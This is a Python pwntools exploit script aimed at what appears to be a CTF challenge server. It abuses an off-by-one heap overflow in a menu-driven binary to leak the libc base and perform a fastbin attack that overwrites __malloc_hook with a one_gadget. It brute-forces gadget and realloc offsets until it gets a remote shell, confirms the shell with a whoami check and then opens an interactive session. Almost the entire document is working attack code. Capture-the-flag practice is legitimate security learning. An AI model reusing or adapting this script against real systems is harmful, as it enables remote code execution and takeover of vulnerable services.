from pwn import *
import sys

context(log_level='warn', arch='amd64', os='linux')

libc = ELF('./libc-2.23.so', checksec=False)

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
realloc_offsets = [0, 2, 4, 6, 8, 10, 12, 16, 20]

HOST = "pwn.challenge.ctf.show"
PORT = 28291

def try_exploit(og_off, realloc_adj):
    try:
        io = remote(HOST, PORT, timeout=10)
    except:
        return False

    def cmd(x):
        io.recvuntil(b'Choice: ')
        io.sendline(str(x).encode())

    def add(size):
        cmd(1)
        io.recvuntil(b'size: ')
        io.sendline(str(size).encode())

    def edit(index, size, data):
        cmd(2)
        io.recvuntil(b'index: ')
        io.sendline(str(index).encode())
        io.recvuntil(b'size: ')
        io.sendline(str(size).encode())
        io.recvuntil(b'content: ')
        io.send(data)

    def delete(index):
        cmd(3)
        io.recvuntil(b'index: ')
        io.sendline(str(index).encode())

    def show(index):
        cmd(4)
        io.recvuntil(b'index: ')
        io.sendline(str(index).encode())

    try:
        # Step 1: alloc 4 chunks
        add(0x68)  # 0
        add(0x68)  # 1
        add(0x68)  # 2
        add(0x68)  # 3

        # Step 2: off-by-one
        show(2)
        payload = p64(0) * 13 + p8(0xe1)
        edit(0, 0x68 + 10, payload)

        # Step 3: free chunk1 into unsorted bin
        delete(1)

        # Step 4: re-alloc chunk1
        add(0x68)  # 1

        # Step 5: leak libc
        show(2)
        io.recvuntil(b': ')
        leak = u64(io.recv(6).ljust(8, b'\x00'))
        libc_base = leak - 0x3c4b78
        malloc_hook = libc_base + libc.sym['__malloc_hook']
        realloc = libc_base + libc.sym['realloc']
        one_gadget = libc_base + og_off

        print(f"  libc_base: {hex(libc_base)}")

        # Step 6: second off-by-one + fastbin dup
        add(0x68)  # 4
        edit(0, 0x68 + 10, payload)
        delete(1)
        add(0xd0)  # 1

        payload2 = p64(0) * 13 + p64(0x71)
        edit(1, len(payload2), payload2)
        delete(2)

        # Step 7: overwrite fd
        edit(4, 0x8, p64(malloc_hook - 0x23))

        # Step 8: fastbin attack
        add(0x68)  # 2
        add(0x68)  # 5

        # Step 9: write one_gadget + realloc
        payload3 = b'a' * (0x13 - 8) + p64(one_gadget) + p64(realloc + realloc_adj)
        edit(5, len(payload3), payload3)

        # Step 10: trigger
        add(0x68)

        # check if we got shell
        io.sendline(b'echo pwned_$(whoami)')
        result = io.recvuntil(b'pwned_', timeout=3)
        if b'pwned_' in result:
            print(f"\n[+] SUCCESS! one_gadget={hex(og_off)} realloc+{realloc_adj}")
            io.interactive()
            return True
        else:
            io.close()
            return False
    except Exception as e:
        try:
            io.close()
        except:
            pass
        return False

print("[*] Brute-forcing one_gadget + realloc offset combinations...")
for og in one_gadgets:
    for radj in realloc_offsets:
        combo = f"one_gadget={hex(og)}, realloc+{radj}"
        print(f"[*] Trying {combo}")
        if try_exploit(og, radj):
            print(f"[+] FOUND WORKING COMBO: {combo}")
            sys.exit(0)

print("[-] All combinations failed.")
